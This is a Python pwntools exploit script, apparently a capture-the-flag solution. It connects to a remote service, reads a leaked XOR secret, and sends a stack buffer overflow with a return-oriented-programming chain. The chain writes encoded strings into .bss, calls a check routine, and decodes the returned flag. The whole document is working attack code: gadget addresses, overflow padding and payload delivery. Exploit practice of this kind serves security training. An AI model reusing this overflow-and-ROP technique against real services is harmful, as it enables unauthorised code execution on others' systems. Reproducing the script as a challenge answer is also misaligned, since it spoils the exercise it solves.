from pwn import *

context.arch = 'amd64'

#0x00000000004020af : pop rdi ; ret
#0x0000000000485e8b : pop rdx ; pop rbx ; ret
#0x00000000004337de : add byte ptr [rax], al ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
#0x00000000004337e3 : mov qword ptr [rdi], rdx ; ret
#0x0000000000401771 : pop rbp ; ret

pop_rdi = 0x00000000004020af
pop_rdx_rbx = 0x0000000000485e8b
mov_rdi_rdx = 0x00000000004337e3
pop_rbp = 0x0000000000401771

bss = 0x4c7320

r = remote('10.113.184.121', 10051)

r.recvuntil(b'secret = ')
secret = r.recvline().strip()
secret = int(secret, 16)

check = 0x4017ba

print("secret:", hex(secret))

val1 = u64(b'kyoumoka') ^ secret
val2 = u64(b'waii'.ljust(8, b'\x00')) ^ secret

print("val1:", hex(val1))
print("val2:", hex(val2))

rop = flat([pop_rdi, bss,
            pop_rdx_rbx, val1, 0,
            mov_rdi_rdx,
            pop_rdi, bss + 0x8,
            pop_rdx_rbx, val2, 0,
            mov_rdi_rdx,
            pop_rdi, bss,
            check])

payload = b'A' * 0x28 + rop

r.recvuntil(b'> ')

r.sendline(payload)

r.recvuntil(b'flag = ')
flag = r.recvline()
flag = p64(u64(flag[0:8]) ^ u64(b'kyoumoka') ^ secret)  + p64(u64(flag[8:16]) ^ u64(b'waii'.ljust(8, b'\x00') )^ secret)

print(flag)
r.close()